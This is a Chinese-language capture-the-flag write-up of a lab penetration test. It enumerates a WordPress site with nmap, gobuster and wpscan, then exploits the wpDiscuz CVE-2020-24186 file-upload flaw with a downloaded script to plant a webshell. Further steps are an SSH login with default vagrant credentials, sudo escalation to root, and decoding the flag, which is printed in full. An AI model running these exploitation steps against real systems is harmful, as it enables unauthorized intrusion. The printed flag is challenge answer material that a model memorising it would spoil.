## BabyPentest
hackmd 連結 : [BabyPentest](https://hackmd.io/@yeyeye618/BygSydd5ixl)
![image](https://hackmd.io/_uploads/HJx4g_ucsel.png)
![image](https://hackmd.io/_uploads/H1rzOucsee.png)
有一個 `blogger.chw:8080` 的連結
![image](https://hackmd.io/_uploads/rk6m__9igx.png)
去改 `/etc/hosts`
```
echo "45.130.165.186 blogger.chw" | sudo tee -a /etc/hosts
```
![image](https://hackmd.io/_uploads/ByVNyt5oge.png)

用 nmap 掃
![image](https://hackmd.io/_uploads/B1iug7pilx.png)
有開 22 (author setting), 2222 ssh, 8080(http)

用 gobuster 掃 `45.130.165.186`
```
gobuster dir -u=http://45.130.165.186:8080 -w=/usr/share/wordlists/rockyou.txt -t 50
```
![image](https://hackmd.io/_uploads/rJ2i6_coxl.png)
gobuster 有掃到 /assets
去看看
![image](https://hackmd.io/_uploads/S10vJYcsxl.png)

在 `/fonts/blog/` 有個網站
![image](https://hackmd.io/_uploads/HJ3nJY5jll.png)
用 wordpress 架的
![image](https://hackmd.io/_uploads/rJlUgKqslx.png)


去找 wordpress 的 pentest 參考
有找到有人寫的一些整理 [wordpress pentest](https://medium.com/@far00t01/wordpress-pentesting-c57f4c11f6f1)

其中有一個工具 [wpscan](https://github.com/wpscanteam/wpscan) 
用來掃描 wordpress 架設的網站
```
wpscan --url http://blogger.chw:8080/assets/fonts/blog/
```
![image](https://hackmd.io/_uploads/S1tsZtcieg.png)

有掃到 Must Use Plugins
![image](https://hackmd.io/_uploads/rkTIMY5ixl.png)
![image](https://hackmd.io/_uploads/r1rSftcsgx.png)
但是下面沒掃到
![image](https://hackmd.io/_uploads/B1LjzFqjxe.png)

改用
```
wpscan --url http://blogger.chw:8080/assets/fonts/blog/ -e p --plugins-detection aggressive
```

![image](https://hackmd.io/_uploads/ryf_XF5jex.png)
有找到兩個套件
* akismet 5.5
* wpdiscuz 7.0.4
```
[!] Title: Comments - wpDiscuz 7.0.0 - 7.0.4 - Unauthenticated Arbitrary File Upload
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/92ae2765-dac8-49dc-a361-99c799573e61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24186
 |      - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
 ```
 有一個正好有 CVE 的版本
 ![image](https://hackmd.io/_uploads/SJuxLGpolg.png)

找到對應的版本的 exploit 下載下來
```
 python3 49967.py -u http://45.130.165.186:8080/assets/fonts/blog/ -p ./?p=1
```
![image](https://hackmd.io/_uploads/SkYFdMaoel.png)

就能夠透過 CVE 對應的漏洞把 webshell 上傳到 server 上
![image](https://hackmd.io/_uploads/ByVltz6ill.png)
用 cmd 參數就能 RCE
![image](https://hackmd.io/_uploads/rJOPFMpjxe.png)
![image](https://hackmd.io/_uploads/Syzd5Mpoel.png)
可以看到有 user_flag.txt 和 3 個用戶
![image](https://hackmd.io/_uploads/BkFA8mTixe.png)
只有 vagrant 有 public key 做 ssh 登入檢驗
![image](https://hackmd.io/_uploads/r1U7P7Tsgx.png)
/etc/shadow 也沒有存
![image](https://hackmd.io/_uploads/HyRy_maogx.png)



撈出 user_flag 
![image](https://hackmd.io/_uploads/HJczifTjxg.png)
奇怪的內容

![image](https://hackmd.io/_uploads/HJf3sfaoll.png)
有可能是 base 編碼
![image](https://hackmd.io/_uploads/By1Y2Gajxe.png)
用 base64 轉出看起來是 hex 
再用 hex 轉 ascii
就可以看到 flag 的前半段了
`is1abCTF{50_h4v3_y0u_`

嘗試用 vagrant 帳號的預設密碼連 2222 port 的 ssh
```
ssh -p 2222 vagrant@45.130.165.186
vagrant@45.130.165.186's password:vagrant
```
![image](https://hackmd.io/_uploads/Hkp7uQTiel.png)
成功

權限還是不夠
![image](https://hackmd.io/_uploads/ByAJKXpseg.png)

嘗試用 `sudo -i`
![image](https://hackmd.io/_uploads/HkXStXaile.png)
竟然成功了

撈撈看 `/root`
![image](https://hackmd.io/_uploads/SJIDtXajxe.png)

有 root_flag 
撈出來可以看到跟 user_flag 類似的內容

一樣的流程再來一次
![image](https://hackmd.io/_uploads/ByxotXpigl.png)

就又後半段 flag 了
`v13w3d_chw'5_f4c3b00k_pr0f1l3}`

全部 flag : `is1abCTF{50_h4v3_y0u_v13w3d_chw'5_f4c3b00k_pr0f1l3}`